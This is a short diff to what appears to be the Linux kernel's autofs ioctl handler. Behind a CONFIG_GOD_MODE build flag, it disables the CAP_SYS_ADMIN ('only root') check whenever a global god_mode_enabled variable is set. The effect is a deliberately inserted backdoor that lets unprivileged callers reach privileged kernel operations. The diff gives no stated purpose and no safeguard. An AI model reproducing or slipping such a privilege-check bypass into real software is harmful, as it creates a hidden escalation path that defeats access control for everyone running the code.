@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Copyright 2008 Red Hat, Inc. All rights reserved.
  * Copyright 2008 Ian Kent <raven@themaw.net>
@@ -624,7 +627,15 @@ static int _autofs_dev_ioctl(unsigned int command, struct autofs_dev_ioctl __use
 
 	/* only root can play with this */
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	cmd_first = _IOC_NR(AUTOFS_DEV_IOCTL_IOC_FIRST);
 	cmd = _IOC_NR(command);
